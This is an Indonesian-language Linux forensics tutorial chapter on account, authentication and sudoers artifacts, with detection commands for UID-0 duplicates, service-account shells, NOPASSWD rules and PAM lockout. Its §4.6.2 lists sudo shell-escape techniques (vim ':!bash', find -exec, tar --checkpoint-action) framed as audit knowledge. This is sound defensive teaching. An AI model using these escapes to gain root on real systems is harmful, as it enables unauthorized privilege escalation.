## 📌 Daftar Isi — Bab 4

- [Bab 4 — User, Auth & Shell Artifacts](#bab-4--user-auth--shell-artifacts)
  - [4.1 Overview & Posisi Bab 4](#41-overview--posisi-bab-4)
  - [4.2 `/etc/passwd` — Struktur & Analisis](#42-etcpasswd--struktur--analisis)
    - [4.2.1 Format 7-field](#421-format-7-field)
    - [4.2.2 UID/GID Ranges](#422-uidgid-ranges)
    - [4.2.3 Shell Field sebagai Indikator](#423-shell-field-sebagai-indikator)
    - [4.2.4 Deteksi Anomali](#424-deteksi-anomali)
  - [4.3 `/etc/shadow` — Password Hash & Aging](#43-etcshadow--password-hash--aging)
    - [4.3.1 Format 9-field & Permission](#431-format-9-field--permission)
    - [4.3.2 Algoritma Hash](#432-algoritma-hash)
    - [4.3.3 Password Aging Fields](#433-password-aging-fields)
    - [4.3.4 Locked/Disabled Account](#434-lockeddisabled-account)
    - [4.3.5 Konteks Cracking (hashcat/john)](#435-konteks-cracking-hashcatjohn)
  - [4.4 `/etc/login.defs` & Password/Account Policy 🔴](#44-etclogindefs--passwordaccount-policy-)
  - [4.5 `/etc/group` & `/etc/gshadow`](#45-etcgroup--etcgshadow)
    - [4.5.1 Grup Privileged](#451-grup-privileged)
    - [4.5.2 Cross-ref ke Bab 3 §3.3.3](#452-cross-ref-ke-bab-3-333)
  - [4.6 sudoers & Privilege Delegation](#46-sudoers--privilege-delegation)
    - [4.6.1 Syntax `/etc/sudoers`](#461-syntax-etcsudoers)
    - [4.6.2 NOPASSWD, Command Alias, Wildcard Risk](#462-nopasswd-command-alias-wildcard-risk)
    - [4.6.3 `sudo -l` sebagai Tool Audit Cepat](#463-sudo--l-sebagai-tool-audit-cepat)
    - [4.6.4 Cross-ref Bab 3 §3.3.2](#464-cross-ref-bab-3-332)
  - [4.7 PAM (Pluggable Authentication Modules)](#47-pam-pluggable-authentication-modules)
    - [4.7.1 `/etc/pam.d/` Overview](#471-etcpamd-overview)
    - [4.7.2 pam_faillock/pam_tally2 🔴](#472-pam_faillockpam_tally2-)
    - [4.7.3 `/etc/security/` 🟡](#473-etcsecurity-)
    - [4.7.4 Pengantar PAM Backdoor](#474-pengantar-pam-backdoor)
  - [4.8 Account Lifecycle Forensics 🔴](#48-account-lifecycle-forensics-)
  - [4.9 `/etc/securetty` & `/etc/nsswitch.conf` 🟡](#49-etcsecuretty--etcnsswitchconf-)
  - [4.10 Shell History Forensics](#410-shell-history-forensics)
    - [4.10.1 `.bash_history`/`.zsh_history`](#4101-bash_historyzsh_history)
    - [4.10.2 Evasion Attacker](#4102-evasion-attacker)
    - [4.10.3 Multi-session Overwrite Behavior](#4103-multi-session-overwrite-behavior)
    - [4.10.4 Sumber Pengganti kalau History Dihapus](#4104-sumber-pengganti-kalau-history-dihapus)
    - [4.10.5 Timestamp History](#4105-timestamp-history)
  - [4.11 Other Shell/Application History Artifacts 🔴](#411-other-shellapplication-history-artifacts-)
  - [4.12 Shell Startup & Config Files](#412-shell-startup--config-files)
  - [4.13 SSH Artifacts](#413-ssh-artifacts)
    - [4.13.1 `~/.ssh/authorized_keys`](#4131-sshauthorized_keys)
    - [4.13.2 `authorized_keys` Options 🔴](#4132-authorized_keys-options-)
    - [4.13.3 `~/.ssh/config` 🔴](#4133-sshconfig-)
    - [4.13.4 `~/.ssh/known_hosts` ⚠️](#4134-sshknown_hosts-️)
    - [4.13.5 Private Key di Disk](#4135-private-key-di-disk)
    - [4.13.6 `/etc/ssh/sshd_config`](#4136-etcsshsshd_config)
    - [4.13.7 SSH Agent Forwarding & Socket](#4137-ssh-agent-forwarding--socket)
  - [4.14 User Session & Login Artifacts (Binary Files)](#414-user-session--login-artifacts-binary-files)
  - [4.15 Home Directory Artifacts Lain (Sekilas)](#415-home-directory-artifacts-lain-sekilas)
  - [4.16 Tabel Korelasi — Pertanyaan Investigasi ke Artefak](#416-tabel-korelasi--pertanyaan-investigasi-ke-artefak)
  - [4.17 Ringkasan Command & Tools Cheat Sheet](#417-ringkasan-command--tools-cheat-sheet)
  - [4.18 Mini Case Study — Workflow End-to-End](#418-mini-case-study--workflow-end-to-end)

---

## Bab 4 — User, Auth & Shell Artifacts

> 💡 **Posisi Bab 4 di seri Linux Forensics:** Bab 3 (Log Forensics) menjawab **"kapan"** dan **"apa"** yang terjadi — siapa login, kapan sudo dijalankan, kapan user dibuat. Bab 4 menjawab pertanyaan yang berbeda: **"seperti apa struktur & konfigurasi akun/auth itu sendiri, saat ini"** — file `/etc/passwd`, `/etc/shadow`, sudoers, PAM, SSH key, dan shell history sebagai artefak state, bukan artefak event. Kedua bab ini **saling melengkapi**, bukan duplikat: log bilang "user `bob` ditambahkan ke grup `sudo` tanggal 10 Agustus", file `/etc/group` bilang "user `bob` **sekarang** anggota grup `sudo`". Investigator butuh dua-duanya untuk gambar utuh.

> ⚠️ **Koreksi analogi umum — SAM/NTDS vs `/etc/passwd`+`/etc/shadow`:** Materi training/artikel sering menyamakan `/etc/passwd` dengan SAM/NTDS Windows secara kasar ("sama-sama database user Linux vs Windows"), lalu implikasinya dianggap "semuanya plaintext dan gampang dibaca". Ini **keliru** dan penting diluruskan dari awal bab:
> - **Yang benar:** hanya `/etc/passwd` yang plaintext & **world-readable** (permission `644` — semua user bisa baca, cuma root yang bisa tulis). Isinya cuma metadata (username, UID, GID, home, shell) — **tidak ada hash password di dalamnya** sejak skema *shadow password* jadi standar (menggantikan skema lama era Unix di mana hash password memang ada langsung di `passwd`).
> - Hash password-nya sendiri disimpan terpisah di `/etc/shadow`, dengan permission ketat `600` atau `640`, **root-only** (dibahas detail §4.3).
> - Analogi yang lebih akurat: `/etc/passwd` itu seperti "SAM hive versi metadata publik yang readable" digabung dengan `/etc/shadow` sebagai "bagian hash yang diproteksi setara SYSTEM/SAM key" — **bukan** "semua isinya plaintext dan terbuka".
>
> Koreksi ini bukan sekadar detail teknis — implikasinya langsung ke forensik: kalau di sebuah sistem ditemukan `/etc/shadow` dengan permission longgar (mis. `644`, world-readable), itu **sendiri** adalah indikator kuat misconfiguration atau tampering, bukan kondisi normal (lihat §4.3.1).

---

### 4.2 `/etc/passwd` — Struktur & Analisis

#### 4.2.1 Format 7-field

**Pengertian & Fungsi:**
`/etc/passwd` adalah database utama identitas user di sistem lokal — satu baris per akun, tujuh field dipisah `:`. Ini adalah titik awal wajib di hampir semua investigasi akun karena langsung menjawab "akun apa saja yang ada di sistem ini".

```
root:x:0:0:root:/root:/bin/bash
alice:x:1001:1001:Alice Wijaya,,,:/home/alice:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

| # | Field | Contoh | Keterangan |
|---|---|---|---|
| 1 | Username | `alice` | Nama login, harus unik |
| 2 | Password placeholder | `x` | Selalu `x` di sistem modern → hash sebenarnya ada di `/etc/shadow`, §4.3. Kalau field ini **bukan** `x` (misal ada hash langsung di sini), itu skema lama/misconfig serius |
| 3 | UID | `1001` | User ID numerik, dibahas §4.2.2 |
| 4 | GID | `1001` | Primary Group ID, cross-ref §4.5 |
| 5 | GECOS | `Alice Wijaya,,,` | Info deskriptif (nama lengkap, kadang kosong), field bebas format |
| 6 | Home directory | `/home/alice` | Lokasi home, cross-ref §4.8 & §1.2.4 |
| 7 | Login shell | `/bin/bash` | Shell yang dijalankan saat login, §4.2.3 |

```bash
# Baca seluruh isi passwd dengan rapi per-field
awk -F: '{print $1, $3, $6, $7}' /etc/passwd
```

---

#### 4.2.2 UID/GID Ranges

**Pengertian & Fungsi:**
Rentang angka UID/GID bukan sekadar nomor urut — polanya menunjukkan **jenis** akun, dan penyimpangan dari pola ini sering jadi sinyal awal anomali.

| Rentang UID | Jenis Akun | Keterangan |
|---|---|---|
| `0` | Root | Hanya boleh **satu** entry dengan UID `0` (biasanya `root`) — dua atau lebih adalah red flag besar, §4.2.4 |
| `1`–`999` (Debian/Ubuntu) atau `1`–`99` (RHEL/CentOS lama) | System/service account | Dibuat otomatis saat install paket (`daemon`, `www-data`, `mysql`, dll), umumnya shell `nologin`/`false` |
| `≥1000` (atau `≥500` di skema lama) | User reguler | Akun manusia yang bisa login interaktif |

> 📌 Batas pasti antara "system" dan "reguler" **ditentukan oleh** `UID_MIN`/`UID_MAX` di `/etc/login.defs` (§4.4) — bukan angka baku universal. Selalu cek file itu untuk memastikan ambang batas di sistem yang sedang diperiksa, karena bisa dikustomisasi.

```bash
# List semua akun dengan UID 0 (harus cuma satu baris: root)
awk -F: '$3==0{print}' /etc/passwd

# List semua akun reguler (UID >= 1000)
awk -F: '$3>=1000{print}' /etc/passwd
```

---

#### 4.2.3 Shell Field sebagai Indikator

**Pengertian & Fungsi:**
Field ke-7 (login shell) menentukan apakah sebuah akun **secara desain** boleh login interaktif atau tidak — dan penyimpangan dari desain ini adalah salah satu indikator paling cepat dicek.

| Shell | Makna |
|---|---|
| `/bin/bash`, `/bin/zsh`, `/bin/sh` | Shell interaktif — akun **dimaksudkan** bisa login |
| `/usr/sbin/nologin`, `/bin/false` | Service/system account — login interaktif **ditolak** secara desain (dipakai hanya untuk run service dengan privilege tertentu, tanpa perlu login manusia) |

> ⚠️ **Sinyal anomali:** Akun sistem (UID di rentang system, §4.2.2) yang **seharusnya** `nologin`/`false` tapi field shell-nya diubah jadi `/bin/bash` — ini pola umum backdoor: attacker "menghidupkan" akun service supaya bisa dipakai login, karena akun service jarang dicurigai dibanding akun user baru yang mencolok.

```bash
# Cari akun UID sistem (di bawah 1000) yang shell-nya interaktif — anomali
awk -F: '$3<1000 && ($7=="/bin/bash" || $7=="/bin/sh" || $7=="/bin/zsh"){print}' /etc/passwd
```

---

#### 4.2.4 Deteksi Anomali

**Pengertian & Fungsi:**
Menggabungkan §4.2.1–4.2.3 jadi checklist praktis untuk triase cepat `/etc/passwd`.

| Anomali | Command Deteksi | Kenapa Signifikan |
|---|---|---|
| UID 0 ganda | `awk -F: '$3==0' /etc/passwd` | Backdoor root kedua — akun apapun namanya, kalau UID `0`, punya privilege root penuh |
| GECOS kosong/aneh di akun yang seharusnya manusia | `awk -F: '{print $1,$5}' /etc/passwd` | Akun dibuat cepat tanpa mengisi metadata biasa (mis. via script otomatis attacker) |
| Home directory di luar `/home` (mis. `/tmp`, `/var/tmp`) | `awk -F: '$6!~/^\/home|^\/root/{print}' /etc/passwd` | Home dir di lokasi tak wajar sering dipakai untuk staging tool attacker sambil menyamar sebagai akun sah |

> 💡 Langkah ini idealnya **selalu** dikombinasikan dengan §4.8 (mtime file `/etc/passwd` sebagai anchor waktu) dan Bab 3 §3.3.3 (log `useradd`/`usermod`) untuk tahu **kapan** anomali ini muncul — file sendiri cuma kasih snapshot state sekarang, bukan histori perubahannya.

---

### 4.3 `/etc/shadow` — Password Hash & Aging

#### 4.3.1 Format 9-field & Permission

**Pengertian & Fungsi:**
`/etc/shadow` menyimpan hash password sebenarnya, terpisah dari `/etc/passwd` demi keamanan (§4.1). Sembilan field dipisah `:`, permission ketat adalah bagian **penting** dari nilai forensiknya, bukan cuma detail administratif.

```
alice:$6$randomsalt$longhashstring...:19580:0:99999:7:::
```

| # | Field | Contoh | Keterangan |
|---|---|---|---|
| 1 | Username | `alice` | Cocok dengan field 1 di `/etc/passwd` |
| 2 | Password hash | `$6$...` | Format `$id$salt$hash`, §4.3.2 |
| 3 | Last change | `19580` | Epoch **hari** (bukan detik) sejak 1 Jan 1970, §4.3.3 |
| 4 | Min days | `0` | Minimum hari sebelum boleh ganti password lagi |
| 5 | Max days | `99999` | Maksimum hari sebelum wajib ganti — nilai default `99999` = praktis tidak pernah expire |
| 6 | Warn days | `7` | Berapa hari sebelum expire user diperingatkan |
| 7 | Inactive days | (kosong) | Grace period setelah expire sebelum akun dikunci |
| 8 | Expire date | (kosong) | Epoch hari kapan akun **kadaluarsa total** |
| 9 | Reserved | (kosong) | Tidak dipakai |

```bash
ls -l /etc/shadow
# -rw-r----- 1 root shadow   (permission normal, 640, group "shadow" only)
```

> ⚠️ **Nilai forensik permission:** `/etc/shadow` **seharusnya** `600` atau `640`, owner `root`, hanya bisa dibaca root (atau grup `shadow` di beberapa distro). Kalau ditemukan permission longgar — misal `644` (world-readable) atau `666` — itu **bukan kondisi normal**. Kemungkinan penyebabnya: misconfiguration administrator, atau bekas aktivitas attacker yang sengaja melonggarkan permission supaya bisa exfiltrate hash tanpa privilege root (mis. lewat proses non-root, atau sebelum privilege escalation berhasil). Ini sendiri layak dicatat sebagai temuan.

---

#### 4.3.2 Algoritma Hash

**Pengertian & Fungsi:**
Prefix `$id$` di awal field hash menunjukkan algoritma yang dipakai — penting untuk menilai kekuatan hash dan menentukan tool/mode yang tepat kalau nanti perlu verifikasi (§4.3.5).

| Prefix | Algoritma | Catatan |
|---|---|---|
| `$1$` | MD5 | Legacy, lemah — kalau masih ditemukan di sistem modern, indikasi sistem lama/belum pernah di-upgrade |
| `$5$` | SHA-256 | Lebih umum di sistem lama-menengah |
| `$6$` | SHA-512 | Paling umum di distro modern (default lama banyak distro) |
| `$y$` / `$7$` | yescrypt | Default di distro modern terbaru (Debian 11+, Ubuntu 22.04+, Fedora) — didesain resisten terhadap GPU cracking |

> 📌 Algoritma yang dipakai ditentukan oleh `ENCRYPT_METHOD` di `/etc/login.defs` (§4.4) — jadi kalau di satu sistem ditemukan campuran algoritma berbeda antar-akun (misal sebagian besar `$y$` tapi satu akun `$1$`), itu bisa mengindikasikan akun tersebut dibuat di waktu/kondisi berbeda dari default sistem (mis. di-restore dari backup lama, atau dibuat manual dengan parameter custom).

---

#### 4.3.3 Password Aging Fields

**Pengertian & Fungsi:**
Field 3 (last change) adalah field dengan nilai forensik paling langsung dari `/etc/shadow` — angka epoch **hari** sejak 1 Januari 1970 yang menunjukkan kapan password terakhir diganti.

```bash
# Konversi epoch days (field 3) ke tanggal manusiawi
date -d "1970-01-01 + 19580 days" "+%Y-%m-%d"
```

> 💡 **Nilai forensik last change:** Field ini adalah bukti independen **kapan** password sebuah akun terakhir diubah — bisa dikorelasikan dengan Bab 3 §3.3.3 (log event `passwd`/`chpasswd`) untuk konfirmasi silang. Kalau log Bab 3 sudah hilang/dihapus attacker tapi `/etc/shadow` masih ada, field last change ini tetap jadi jejak independen bahwa password **pernah** diubah pada tanggal tertentu — meski tidak menjelaskan siapa yang mengubahnya (itu perlu log atau konteks lain).

Field lain (min/max/warn/inactive/expire) lebih relevan untuk menilai **policy** yang berlaku ke akun tersebut daripada bukti event langsung — misalnya `max days` yang di-set sangat besar pada akun tertentu (padahal policy default sistem lebih ketat) bisa jadi tanda akun itu sengaja dikecualikan dari kewajiban ganti password, layak dicurigai kalau tidak ada justifikasi administratif.

---

#### 4.3.4 Locked/Disabled Account

**Pengertian & Fungsi:**
Karakter di depan field hash (field 2) menunjukkan status akun — penting dibedakan karena masing-masing simbol punya arti berbeda.

| Prefix Field Hash | Arti |
|---|---|
| `$6$...` (hash aktif normal) | Akun bisa login dengan password |
| `!` di depan hash (`!$6$...`) | Akun **dikunci** (`passwd -l` / `usermod -L`) — password tetap tersimpan di baliknya, tinggal di-unlock |
| `!!` | Akun belum pernah di-set password sama sekali, atau field kosong dengan lock ganda |
| `*` | Akun dinonaktifkan secara permanen untuk login password (umum di akun sistem) — tidak bisa login pakai password apapun |

> ⚠️ Akun dengan `!` di depan hash **masih menyimpan hash asli** — kalau attacker sempat `usermod -U` (unlock) sebentar lalu lock kembali, hash-nya tetap sama seperti sebelum dikunci. Ini beda signifikansi dengan `*` yang memang tidak ada hash valid untuk di-unlock.

---

#### 4.3.5 Konteks Cracking (hashcat/john)

Disebut sebatas **konteks investigasi**, bukan tutorial teknis cracking: dalam skenario tertentu (misalnya menilai apakah password akun yang dicurigai dikompromikan itu "lemah" dan mudah ditebak, sebagai bagian menilai skenario serangan brute-force), investigator forensik bisa memverifikasi kekuatan hash dengan tool seperti `hashcat` atau `john the ripper` terhadap hash yang **sudah diekstrak secara sah** dari `/etc/shadow` dalam scope investigasi yang diotorisasi. Detail teknis command dan mode cracking di luar cakupan bab ini.

---

### 4.4 `/etc/login.defs` & Password/Account Policy 🔴

**Pengertian & Fungsi:**
`/etc/login.defs` adalah file konfigurasi **default policy** sistem-wide untuk akun baru — bukan menyimpan data akun individual (itu tugas `/etc/passwd`/`/etc/shadow`), tapi menentukan aturan default apa yang berlaku saat akun dibuat.

| Parameter | Fungsi |
|---|---|
| `PASS_MAX_DAYS` | Default maksimum hari sebelum password wajib diganti |
| `PASS_MIN_DAYS` | Default minimum hari sebelum boleh ganti password lagi |
| `PASS_WARN_AGE` | Default hari peringatan sebelum expire |
| `UID_MIN` / `UID_MAX` | Rentang UID untuk user reguler — dipakai untuk menentukan ambang batas di §4.2.2 |
| `GID_MIN` / `GID_MAX` | Rentang GID setara untuk grup |
| `ENCRYPT_METHOD` | Algoritma hash default untuk password baru, cross-ref §4.3.2 |

```bash
grep -E "^PASS_MAX_DAYS|^PASS_MIN_DAYS|^UID_MIN|^UID_MAX|^ENCRYPT_METHOD" /etc/login.defs
```

**File terkait lain di area yang sama:**
- `/etc/default/useradd` — default shell & home directory untuk user baru (`useradd -D` untuk lihat isinya).
- `/etc/skel/` — direktori berisi file baseline (`.bashrc`, `.profile`, dll) yang **di-copy** ke home directory user baru saat dibuat. Relevan untuk §4.8/§4.12: kalau investigator ingin tahu apakah file konfigurasi shell user baru "sudah dimodifikasi" dari kondisi awal, bandingkan langsung dengan isi `/etc/skel/` sebagai baseline pembanding.

> 🔴 **Nilai forensik policy longgar:** `PASS_MAX_DAYS=99999` (nilai default banyak distro, artinya password praktis tidak pernah kadaluarsa) adalah indikator **hardening lemah** di sistem tersebut — bukan bukti kompromi langsung, tapi konteks penting saat menilai postur keamanan keseluruhan sistem yang sedang diinvestigasi.

---

### 4.5 `/etc/group` & `/etc/gshadow`

#### 4.5.1 Grup Privileged

**Pengertian & Fungsi:**
`/etc/group` mendaftar semua grup beserta anggotanya (format `groupname:x:GID:member1,member2`). Sejumlah grup punya privilege setara root secara efektif — keanggotaan di grup ini sama pentingnya dengan UID 0 langsung.

| Grup | Kenapa Kritis |
|---|---|
| `sudo` (Debian/Ubuntu) / `wheel` (RHEL/CentOS) | Anggota bisa jalankan `sudo` — cross-ref kebijakan detail di §4.6 |
| `docker` | Anggota bisa akses Docker socket (`/var/run/docker.sock`) — privilege escalation klasik karena container bisa mount `/` host dengan privilege root container |
| `adm` | Akses baca ke banyak file log di `/var/log` tanpa perlu root |
| `disk` | Akses langsung ke raw block device (`/dev/sd*`) — praktis setara akses fisik ke seluruh data disk, bypass permission filesystem |

```bash
# Cek anggota grup privileged
getent group sudo docker adm disk
```

`/etc/gshadow` adalah versi "shadow" untuk grup (password grup & admin grup) — jarang dipakai di praktik modern, tapi tetap perlu dicek terutama field admin (`groupname:hash:admin1,admin2:member1,member2`) untuk melihat siapa yang punya hak mengelola grup itu.

---

#### 4.5.2 Cross-ref ke Bab 3 §3.3.3

Sama seperti hubungan `/etc/passwd`/`/etc/shadow` dengan log, `/etc/group` & `/etc/gshadow` memberi **state sekarang** (siapa anggota grup apa saat ini), sementara Bab 3 §3.3.3 (log event `usermod`/`gpasswd`) memberi **kapan** keanggotaan itu berubah. Investigasi yang solid selalu mengonfirmasi keduanya — file tanpa log kehilangan konteks waktu, log tanpa file kehilangan konfirmasi apakah perubahan itu masih berlaku sekarang atau sudah di-revert.

---

### 4.6 sudoers & Privilege Delegation

#### 4.6.1 Syntax `/etc/sudoers`

**Pengertian & Fungsi:**
`/etc/sudoers` mendefinisikan siapa boleh menjalankan apa sebagai user lain (biasanya root) lewat `sudo`. File utama plus direktori `/etc/sudoers.d/*` (fragment tambahan, di-include otomatis) — keduanya harus dicek, attacker sering menaruh rule tambahan di `sudoers.d/` karena kurang diperhatikan dibanding file utama.

```
# Format dasar:
user_or_group  host = (runas_user) command_list

# Contoh:
alice   ALL=(ALL:ALL) ALL
%sudo   ALL=(ALL:ALL) ALL
```

> ⚠️ **Selalu edit lewat `visudo`**, bukan editor teks langsung — `visudo` melakukan syntax check sebelum save, mencegah file rusak yang bisa mengunci akses sudo seluruh sistem. Dari sisi forensik, keberadaan editor teks langsung mengubah `sudoers` (bukan lewat `visudo`) yang tercatat di history/log adalah sinyal aktivitas tidak standar.

---

#### 4.6.2 NOPASSWD, Command Alias, Wildcard Risk

**Pengertian & Fungsi:**
Beberapa pola konfigurasi sudoers secara khusus berisiko tinggi dan sering jadi vektor privilege escalation:

| Pola | Risiko |
|---|---|
| `NOPASSWD:` | User bisa `sudo` **tanpa** diminta password — kalau session user itu sudah dikompromikan, attacker langsung dapat root tanpa perlu tahu password apapun |
| Command alias longgar | Mendefinisikan grup command lewat alias (`Cmnd_Alias`) yang cakupannya terlalu luas |
| Wildcard pada binary yang punya fitur shell-out | Contoh klasik: `alice ALL=(ALL) NOPASSWD: /usr/bin/vim *` — kelihatan seperti membatasi ke "cuma vim", tapi karena vim punya command internal untuk jalankan shell (`:!bash`), rule ini efektif setara `NOPASSWD: ALL`. Ini pola khas yang dikatalogkan di proyek **GTFOBins** — banyak binary umum (`vim`, `less`, `find`, `awk`, dll) punya fitur bawaan yang bisa dieksploitasi kalau diberi akses sudo tanpa batasan argumen yang ketat |

```bash
# Cari baris NOPASSWD di sudoers utama & fragment
grep -rn "NOPASSWD" /etc/sudoers /etc/sudoers.d/
```

> 📌 **Catalog GTFOBins secara umum:** GTFOBins (`gtfobins.github.io`) adalah proyek yang mendokumentasikan binary Unix umum beserta cara binary itu bisa disalahgunakan untuk bypass batasan lokal (shell escape, baca/tulis file, privilege escalation) kalau diberi akses berlebih — lewat sudo, SUID bit, atau capability tertentu. Konteks di bab ini murni **sudut pandang investigasi**: mengenali rule `sudoers` mana yang berisiko tinggi berdasarkan katalog ini, bukan tutorial eksploitasi. Tabel di bawah adalah beberapa contoh binary yang **sering muncul** di rule sudoers dunia nyata dan kenapa masing-masing berisiko kalau diberi akses tanpa batasan argumen:

| Binary di Rule Sudoers | Kenapa Berisiko (Fitur Bawaan) | Pola Rule Contoh |
|---|---|---|
| `vim` / `vi` | Punya command internal `:!<cmd>` dan `:shell` untuk menjalankan shell dari dalam editor | `NOPASSWD: /usr/bin/vim *` |
| `less` / `more` | Saat menampilkan file panjang, bisa masuk ke shell lewat `!<cmd>` di prompt pager | `NOPASSWD: /usr/bin/less *` |
| `find` | Opsi `-exec` built-in untuk menjalankan command arbitrer terhadap hasil pencarian | `NOPASSWD: /usr/bin/find /var -exec {} \;` (kalau argumen `-exec` tidak dibatasi) |
| `awk` | Bisa menjalankan system call lewat fungsi `system()` di dalam script AWK | `NOPASSWD: /usr/bin/awk *` |
| `tar` | Opsi `--checkpoint-action` bisa dipakai memicu eksekusi command sebelum/selama proses arsip | `NOPASSWD: /bin/tar *` |
| `python`/`perl`/`ruby` (interpreter) | Interpreter bahasa scripting penuh — kalau diizinkan tanpa batasan argumen, praktis setara shell bebas | `NOPASSWD: /usr/bin/python3` (tanpa argumen dibatasi) |

> ⚠️ **Pola umum yang membuat rule di atas benar-benar aman vs berbahaya** bukan soal binary-nya sendiri, tapi soal **seberapa ketat argumen dibatasi**. `NOPASSWD: /usr/bin/find /var/backup -name "*.tar.gz"` (argumen spesifik, tidak ada `-exec`) jauh lebih aman dibanding `NOPASSWD: /usr/bin/find *` (wildcard penuh, semua opsi termasuk `-exec` diizinkan). Saat mengaudit sudoers, investigator perlu membaca **argumen lengkap** tiap rule, bukan cuma nama binary-nya.

---

#### 4.6.3 `sudo -l` sebagai Tool Audit Cepat

**Pengertian & Fungsi:**
`sudo -l` (dijalankan sebagai user yang bersangkutan, atau sebagai root dengan `sudo -l -U <username>`) menampilkan ringkasan command apa saja yang diizinkan untuk user tersebut — cara cepat mengaudit privilege efektif tanpa perlu membaca manual seluruh isi sudoers dan resolusi alias-nya secara manual.

```bash
sudo -l -U alice
```

---

#### 4.6.4 Cross-ref Bab 3 §3.3.2

Sekali lagi pola yang sama berulang: `sudoers` menunjukkan apa yang **diizinkan** untuk dijalankan, sementara log Bab 3 §3.3.2 (command log `sudo`) menunjukkan apa yang **benar-benar dijalankan**. User bisa saja punya akses `NOPASSWD: ALL` tapi tidak pernah memakainya secara mencurigakan — atau sebaliknya, log menunjukkan command sudo yang dijalankan **di luar** apa yang diizinkan sudoers saat ini (indikasi rule sudoers sudah diubah/dilonggarkan lalu dikembalikan lagi setelah dipakai).

---

### 4.7 PAM (Pluggable Authentication Modules)

#### 4.7.1 `/etc/pam.d/` Overview

**Pengertian & Fungsi:**
PAM adalah kerangka modular yang menentukan **bagaimana** proses autentikasi berjalan untuk tiap layanan (login, sshd, sudo, dll) — satu file konfigurasi per layanan di `/etc/pam.d/`. Struktur stack-nya penting dipahami sebelum melihat modul spesifik.

**Empat tipe management group (stack):**

| Tipe | Fungsi |
|---|---|
| `auth` | Verifikasi identitas (password check, dsb) |
| `account` | Verifikasi status akun (expired, locked, dsb — **bukan** password) |
| `password` | Mengatur update password |
| `session` | Setup/cleanup sesi (mount home, set env, logging) |

**Control flag** menentukan apa yang terjadi kalau sebuah modul di stack gagal/berhasil:

| Flag | Perilaku |
|---|---|
| `required` | Kalau gagal, tetap lanjut ke modul berikutnya di stack, tapi hasil akhir stack pasti gagal |
| `requisite` | Kalau gagal, **langsung** hentikan stack seketika (tidak lanjut ke modul lain) |
| `sufficient` | Kalau berhasil **dan** tidak ada modul `required` sebelumnya yang gagal, langsung anggap stack berhasil (skip sisanya) |
| `optional` | Hasilnya umumnya tidak menentukan sukses/gagalnya stack, kecuali jadi satu-satunya modul di stack itu |

```bash
cat /etc/pam.d/sshd
cat /etc/pam.d/sudo
```

**Contoh isi `/etc/pam.d/sshd` (disederhanakan) dan pembacaannya baris per baris:**

```
auth       required     pam_faillock.so preauth
auth       [success=1 default=ignore] pam_unix.so nullok_secure
auth       [default=die]   pam_faillock.so authfail
auth       requisite    pam_deny.so
auth       required     pam_faillock.so authsucc
account    required     pam_unix.so
account    required     pam_faillock.so
password   required     pam_pwquality.so retry=3
password   sufficient   pam_unix.so sha512 shadow
session    required     pam_limits.so
session    optional     pam_lastlog.so
session    required     pam_unix.so
```

| Baris | Pembacaan |
|---|---|
| `auth required pam_faillock.so preauth` | Sebelum password dicek, hitung dulu apakah user sedang dalam status lockout (§4.7.2). Kalau iya, tetap lanjut cek modul berikutnya (`required`), tapi hasil akhir stack `auth` dipastikan gagal |
| `auth [success=1 default=ignore] pam_unix.so nullok_secure` | Modul verifikasi password standar. Sintaks `[success=1 default=ignore]` adalah bentuk control flag lebih rinci (bukan sekadar `required`/`sufficient`) — kalau sukses, **lompat 1 baris** ke depan (skip baris `authfail`); kalau gagal dengan hasil lain, diabaikan dan lanjut ke baris berikutnya apa adanya |
| `auth [default=die] pam_faillock.so authfail` | Baris ini **hanya tereksekusi kalau password di atas gagal** (karena baris sukses tadi sudah skip ke sini). Modul mencatat kegagalan ini ke counter faillock, lalu `[default=die]` langsung menghentikan seluruh stack `auth` seketika |
| `auth requisite pam_deny.so` | Fallback penolakan eksplisit — praktis tidak pernah tereksekusi normal karena baris di atas sudah `die` duluan kalau gagal, tapi tetap ada sebagai pengaman struktur stack |
| `auth required pam_faillock.so authsucc` | Kalau proses sampai baris ini (artinya auth berhasil), reset counter kegagalan faillock user tersebut kembali ke nol |
| `account required pam_unix.so` | Verifikasi status akun dasar (bukan expired/locked di level `passwd`/`shadow`, §4.2–4.3) |
| `account required pam_faillock.so` | Verifikasi ulang status lockout di tahap `account` (lapisan kedua selain di `auth`) |
| `password required pam_pwquality.so retry=3` | Mengecek kekuatan password baru (panjang, kompleksitas) saat user ganti password, maksimal 3 kali percobaan sebelum ditolak |
| `password sufficient pam_unix.so sha512 shadow` | Menyimpan hash password baru ke `/etc/shadow` memakai algoritma SHA-512 (§4.3.2) |
| `session required pam_limits.so` | Menerapkan batasan resource dari `/etc/security/limits.conf` (§4.7.3) saat sesi dimulai |
| `session optional pam_lastlog.so` | Update `/var/log/lastlog` (§4.14) dan tampilkan info login terakhir ke user |
| `session required pam_unix.so` | Setup dasar sesi (mis. logging session start ke syslog) |

> 💡 **Kenapa membaca stack lengkap seperti ini penting secara forensik:** Modul & urutan yang tampak "standar" seperti contoh di atas adalah baseline pembanding. Kalau investigator menemukan baris **asing** disisipkan di antara baris normal (terutama di stack `auth`, karena itu titik paling sensitif) — misalnya modul dengan path tidak lazim (`/usr/lib/x86_64-linux-gnu/security/pam_unix_backdoor.so` atau nama modul yang di-typo mirip modul asli) — itu sinyal kuat PAM backdoor yang layak diselidiki lebih lanjut (§4.7.4, detail penuh di Bab 8).

---

#### 4.7.2 pam_faillock/pam_tally2 🔴

**Pengertian & Fungsi:**
Modul yang mengimplementasikan **account lockout policy** — mengunci akun setelah sejumlah percobaan login gagal beruntun, mitigasi brute force di level PAM (terpisah dari mekanisme apapun di layer aplikasi). `pam_faillock` adalah modul modern (menggantikan `pam_tally2` yang lebih lama).

| Parameter (`faillock.conf` atau argumen modul) | Fungsi |
|---|---|
| `deny=` | Jumlah percobaan gagal sebelum akun dikunci |
| `unlock_time=` | Berapa detik sampai lock otomatis terlepas |

```bash
# Cek status lockout akun tertentu
faillock --user alice

# Reset lockout (butuh privilege admin)
faillock --user alice --reset
```

> ⚠️ **Beda granularitas dengan `Failed password` di auth.log (Bab 3 §3.3.1):** Log `auth.log`/`journald` mencatat **setiap** percobaan gagal individual sebagai event terpisah. `pam_faillock` menyimpan **counter kumulatif** per user (berapa kali gagal beruntun, kapan terakhir) — bukan histori tiap percobaan. Keduanya saling melengkapi: log kasih linimasa detail tiap percobaan, faillock kasih state "apakah akun ini sedang terkunci sekarang dan kenapa".

---

#### 4.7.3 `/etc/security/` 🟡

